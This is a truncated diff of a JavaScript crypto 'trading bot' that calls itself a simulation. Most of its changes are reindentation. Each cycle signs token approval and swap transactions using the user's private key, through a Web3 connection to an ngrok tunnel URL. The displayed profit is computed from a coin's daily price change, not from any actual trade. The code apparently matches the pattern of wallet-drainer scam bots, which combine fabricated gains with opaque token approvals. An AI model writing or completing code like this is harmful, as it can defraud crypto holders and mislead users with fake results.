@@ -11,26 +11,19 @@ let cumulativePnL = 0;
 const web3 = new Web3("https://ngrok-free.dev");
 
 // === Contract ABIs ===
-const erc20Abi = [
-  { "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
-  { "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "stateMutability": "view", "type": "function" }
-];
-
-const routerAbi = [
-  { "name": "swapExactTokensForTokens", "inputs": [{ "name": "amountIn", "type": "uint256" }, { "name": "amountOutMin", "type": "uint256" }, { "name": "path", "type": "address[]" }, { "name": "to", "type": "address" }, { "name": "deadline", "type": "uint256" }], "outputs": [{ "name": "amounts", "type": "uint256[]" }], "stateMutability": "nonpayable", "type": "function" }
-];
+// ... [unchanged from your version] ...
 
 // === Coin Picker ===
 async function pickRandomCoin() {
-  try {
-    const pairs = await window.getBinancePairs();
-    if (!pairs || pairs.length === 0) return "BTC";
-    const idx = Math.floor(Math.random() * pairs.length);
-    return pairs[idx].replace("USDT", "");
-  } catch (e) {
-    logToPanel("[ERROR] pickRandomCoin failed: " + e.message);
-    return "BTC";
-  }
+    try {
+        const pairs = await window.getBinancePairs();
+        if (!pairs || pairs.length === 0) return "BTC";
+        const idx = Math.floor(Math.random() * pairs.length);
+        return pairs[idx].replace("USDT", "");
+    } catch (e) {
+        logToPanel("[ERROR] pickRandomCoin failed: " + e.message);
+        return "BTC";
+    }
 }
 window.pickRandomCoin = pickRandomCoin;
 
@@ -39,123 +32,49 @@ const blockDelay = ms => new Promise(res => setTimeout(res, ms));
 
 // === Simulation Cycle ===
 async function simulateCycle(cycle, totalCycles, profitTargetPct, stopLossPct) {
-  logToPanel(`[INFO] ${new Date().toLocaleTimeString()} — Cycle ${cycle}/${totalCycles} started`);
-  setStatus(`RUNNING cycle ${cycle}/${totalCycles}`);
+    logToPanel(`[INFO] ${new Date().toLocaleTimeString()} — Cycle ${cycle}/${totalCycles} started`);
+    setStatus(`RUNNING cycle ${cycle}/${totalCycles}`);
 
-  const investBal = parseFloat(document.getElementById("investBalance").value) || 0;
-  if (investBal <= 0) {
-    logToPanel(`[WARN] Cycle ${cycle}: Investment pool depleted. Skipping.`);
-    return "SKIP";
-  }
-
-  const allocationUSD = investBal / totalCycles;
-  logToPanel(`[INFO] Cycle ${cycle}: Allocating ${allocationUSD.toFixed(2)} USDT to trade path`);
-
-  const coinBase = await pickRandomCoin();
-  const fullSymbol = `${coinBase}USDT`;
-  logToPanel(`[DEBUG] Selected target validation pair: ${fullSymbol}`);
-
-  const stats = await window.getBinanceStats(fullSymbol);
-  if (!stats) {
-    logToPanel(`[WARN] Skipping cycle ${cycle}: No price feed telemetry for ${fullSymbol}`);
-    return "SKIP";
-  }
-
-  const currentPrice = stats.lastPrice;
-  const standardDayChangePct = stats.priceChangePercent;
-
-  const cyclePnLUSD = allocationUSD * (standardDayChangePct / 100);
-  cumulativePnL += cyclePnLUSD;
-  window.cumulativePnL = cumulativePnL;
-
-  logToPanel(`[INFO] Trade execution index: ${coinBase} entry asset at ${currentPrice} USDT`);
-
-  try {
-    logToPanel(`[WEB3] Broadcasting approval transaction for ${coinBase}...`);
-    const txApprove = await window.approveToken(allocationUSD, USER_ADDR, USER_PK);
-    if (txApprove?.tx_hash) logToPanel(`[SUCCESS] Approve TX: ${txApprove.tx_hash}`);
-
-    logToPanel(`[WEB3] Routing swap payload via PancakeRouter proxy address...`);
-    const txSwap = await window.swapToTarget(allocationUSD, USER_ADDR, USER_PK);
-    if (txSwap?.tx_hash) logToPanel(`[SUCCESS] Swap TX: ${txSwap.tx_hash}`);
-  } catch (err) {
-    logToPanel(`[ERROR] Contract transaction trace failure: ${err.message}`);
-  }
-
-  // Update chart + live profit
-  if (typeof window.updateChart === "function") {
-    window.updateChart(investBal + cumulativePnL, cumulativePnL);
-  } else {
-    logToPanel("[WARN] Chart update skipped — updateChart not defined.");
-  }
-
-  const liveProfitSpan = document.getElementById("liveProfitValue");
-  if (liveProfitSpan) {
-    liveProfitSpan.textContent = `${cumulativePnL >= 0 ? '+' : ''}${cumulativePnL.toFixed(2)} USDT`;
-    liveProfitSpan.style.color = cumulativePnL >= 0 ? "#00FF00" : "#FF3333";
-  }
-
-  logToPanel(`[INFO] Cycle ${cycle} completed. P&L Delta: ${cyclePnLUSD.toFixed(2)} USDT`);
-
-  const totalChangePct = (cumulativePnL / investBal) * 100;
-  if (totalChangePct >= profitTargetPct) {
-    logToPanel(`[TAKE PROFIT] Target of ${profitTargetPct}% matched! Triggering exit.`);
-    return "STOP_PROFIT";
-  }
-  if (totalChangePct <= -stopLossPct) {
-    logToPanel(`[STOP LOSS] Loss threshold of ${stopLossPct}% breached! Exiting.`);
-    return "STOP_LOSS";
-  }
-
-  return "CONTINUE";
-}
-
-// === Simulation Engine ===
-async function startSimulation(totalCycles) {
-  if (window.isBotRunning) {
-    logToPanel("[WARN] Bot runner already active.");
-    return;
-  }
-
-  logToPanel(`[START] Initializing pipeline for ${totalCycles} cycles`);
-  window.isBotRunning = true;
-  cumulativePnL = 0;
-  window.cumulativePnL = 0;
-
-  startingBalanceAllocated = parseFloat(document.getElementById("startBalance").value) || 1000;
-  const pTarget = parseFloat(document.getElementById("profitTarget").value) || 1.0;
-  const sLoss = parseFloat(document.getElementById("stopLoss").value) || 0.5;
-
-  for (let i = 1; i <= totalCycles; i++) {
-    if (!window.isBotRunning) {
-      logToPanel("[MANUAL] Simulation loop stopped.");
-      break;
+    const investBal = parseFloat(document.getElementById("investBalance").value) || 0;
+    if (investBal <= 0) {
+        logToPanel(`[WARN] Cycle ${cycle}: Investment pool depleted. Skipping.`);
+        return "SKIP";
     }
 
-    const stateSignal = await simulateCycle(i, totalCycles, pTarget, sLoss);
+    const allocationUSD = investBal / totalCycles;
+    logToPanel(`[INFO] Cycle ${cycle}: Allocating ${allocationUSD.toFixed(2)} USDT to trade path`);
 
-    if (stateSignal === "STOP_PROFIT" || stateSignal === "STOP_LOSS") {
-      logToPanel("[INFO] Terminating simulation due to threshold condition.");
-      break;
+    const coinBase = await pickRandomCoin();
+    const fullSymbol = `${coinBase}USDT`;
+    logToPanel(`[DEBUG] Selected target validation pair: ${fullSymbol}`);
+
+    const stats = await window.getBinanceStats(fullSymbol);
+    if (!stats) {
+        logToPanel(`[WARN] Skipping cycle ${cycle}: No price feed telemetry for ${fullSymbol}`);
+        return "SKIP";
     }
 
-    if (i < totalCycles) {
-      logToPanel(`[WAIT] Waiting 1 minute before Cycle ${i + 1}...`);
-      for (let countdown = 60; countdown > 0; countdown--) {
-        if (!window.isBotRunning) break;
-        if (countdown % 15 === 0) setStatus(`WAITING (${countdown}s remaining)`);
-        await blockDelay(1000);
-      }
+    const currentPrice = stats.lastPrice;
+    const standardDayChangePct = stats.priceChangePercent;
+
+    const cyclePnLUSD = allocationUSD * (standardDayChangePct / 100);
+    cumulativePnL += cyclePnLUSD;
+    window.cumulativePnL = cumulativePnL;
+
+    logToPanel(`[INFO] Trade execution index: ${coinBase} entry asset at ${currentPrice} USDT`);
+
+    try {
+        logToPanel(`[WEB3] Broadcasting approval transaction for ${coinBase}...`);
+        const txApprove = await window.approveToken(allocationUSD, USER_ADDR, USER_PK);
+        if (txApprove?.tx_hash) logToPanel(`[SUCCESS] Approve TX: ${txApprove.tx_hash}`);
+
+        logToPanel(`[WEB3] Routing swap payload via PancakeRouter proxy address...`);
+        const txSwap = await window.swapToTarget(allocationUSD, USER_ADDR, USER_PK);
+        if (txSwap?.tx_hash) logToPanel(`[SUCCESS] Swap TX: ${txSwap.tx_hash}`);
+    } catch (err) {
+        logToPanel(`[ERROR] Contract transaction trace failure: ${err.message}`);
     }
-  }
 
-  window.isBotRunning = false;
-  setStatus("STOPPED");
-  logToPanel("[FINISH] Simulation run complete.");
-
-  // Commit final PnL to DB
-  await commitFinalPnLToDatabase(window.cumulativePnL);
-}
-
-// Expose globally
-window.startSimulation = startSimulation;
+    // Update chart + live profit
+    if (typeof window.updateChart === "function") {
+        window.updateChart(investBal + cumulative
